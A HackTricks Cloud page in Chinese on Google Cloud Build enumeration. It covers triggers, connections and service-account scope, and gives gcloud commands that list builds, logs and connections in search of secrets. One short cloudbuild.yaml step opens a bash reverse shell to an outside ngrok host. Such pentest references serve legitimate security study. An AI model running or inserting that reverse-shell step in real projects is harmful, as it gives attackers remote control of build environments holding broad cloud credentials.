# GCP - Cloud Build 枚举

<details>

<summary><strong>从零到英雄学习AWS黑客技术，参加</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。**

</details>

## 基本信息

Google Cloud Build是一个托管的CI/CD平台，**自动化软件构建**和发布流程，与**源代码仓库**集成，并支持广泛的编程语言。它**允许开发人员自动构建、测试和部署代码**，同时提供自定义构建步骤和工作流程的灵活性。

每个Cloud Build触发器都**与Cloud仓库相关联或直接与外部仓库连接**（Github、Bitbucket和Gitlab）。

{% hint style="success" %}
我没有看到任何方法可以从这里或Cloud仓库窃取Github/Bitbucket令牌，因为当下载仓库时，它是通过[https://source.cloud.google.com/](https://source.cloud.google.com/) URL访问的，客户端不会访问Github。
{% endhint %}

### 事件

Cloud Build可以在以下情况下触发：

* **推送到分支**：指定分支
* **推送新标签**：指定标签
* **拉取请求**：指定接收PR的分支
* **手动调用**
* **Pub/Sub消息**：指定主题
* **Webhook事件**：将暴露一个HTTPS URL，请求必须使用密钥进行认证

### 执行

有3个选项：

* 一个yaml/json **指定要执行的命令**。通常是：`/cloudbuild.yaml`
* 只有一个可以在网络控制台和命令行界面中“内联”指定
* 最常见的选项
* 对于未经认证的访问很重要
* 一个**Dockerfile**来构建
* 一个**Buildpack**来构建

### SA权限

**服务帐户具有`cloud-platform`范围**，因此可以**使用所有权限**。如果**没有指定SA**（如在提交时），将使用**默认SA** `<proj-number>@cloudbuild.gserviceaccount.com`。

默认情况下不赋予任何权限，但给予权限相当容易：

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### 审批

可以配置Cloud Build以**要求对构建执行进行审批**（默认禁用）。

### 连接 & 仓库

连接可以通过以下方式创建：

* **GitHub**：它将显示一个OAuth提示，要求权限以**获取Github令牌**，该令牌将存储在**Secret Manager**内。
* **GitHub Enterprise**：它将要求安装一个**GithubApp**。将在您的GitHub Enterprise主机上创建一个**认证令牌**，并将其作为S**ecret Manager**密钥存储在此项目中。
* **GitLab / Enterprise**：您需要提供**API访问令牌和读取API访问令牌**，这些将存储在**Secret Manager**中。

一旦生成连接，您可以使用它来**链接Github帐户有权访问的仓库**。

此选项可通过以下按钮访问：

<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
请注意，使用此方法连接的仓库**仅在使用第二代触发器时可用**。
{% endhint %}

### 连接仓库

这与**`connection`**不同。这允许**不同**的方式来获取**访问Github或Bitbucket**仓库的权限，但**不会生成连接对象，但它确实会生成一个仓库对象（第一代）。**

此选项可通过以下按钮访问：

<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

### 存储

有时Cloud Build会**生成一个新的存储来存储触发器的文件**。例如，在GCP提供的示例中就会发生这种情况：
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
存储桶名为[security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox)被创建用来存储将要使用的`.tgz`文件。

### 获取shell
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### 枚举

您可能会在构建配置和日志中发现**敏感信息**。
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### 权限提升

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### 未经认证的访问

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### 后期利用

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**telegram群组**](https://t.me/peass)或在**Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享您的黑客技巧。

</details>
